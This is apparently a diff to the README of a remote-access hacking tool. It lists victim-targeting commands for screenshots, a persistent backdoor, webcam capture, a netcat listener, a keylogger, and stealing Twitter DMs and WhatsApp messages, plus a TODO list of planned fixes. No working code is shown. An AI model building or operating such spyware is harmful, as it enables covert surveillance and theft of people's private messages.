@@ -65,12 +65,21 @@ ENTER
 
 - /screenshot ```IP``` (Capture screen of a PC)
 - /backdoor ```IP``` (Creates a persistent backdoor in a PC)
-- /keylogger ```IP``` ```time```
 - /webcam ```IP```
 - /nc ```IP``` (nc -lp 8888)
+- /keylogger ```IP``` ```time``` [Not work]
 
 #### Ultra :squirrel: 
 
 - /hackT ```IP``` (Get Twitter dms if the victim is authenticated) [Only web - W10]
 - /hackW ```IP``` (Get WhatsApp messages if the victim is authenticated) [Only Web - W10]
 - <img src="https://static-cdn.jtvnw.net/emoticons/v1/112290/1.0" width="15px" height="15px" /> /twitch ```IP``` ```STREAM_KEY```
+
+##### TODO
+
+- Change all Invoke-WebRequest to cURL. (Invoke-WebRequest requires set up Internet Explorer)
+- Hack WhatsApp on .exe.
+- Fix Twitch streaming.
+- Fix keylogger.
+- Add monitor selector to screenshot.
+- Add windows version detector in HackTwitterW10() and hackWhatsAPPW10() functions.
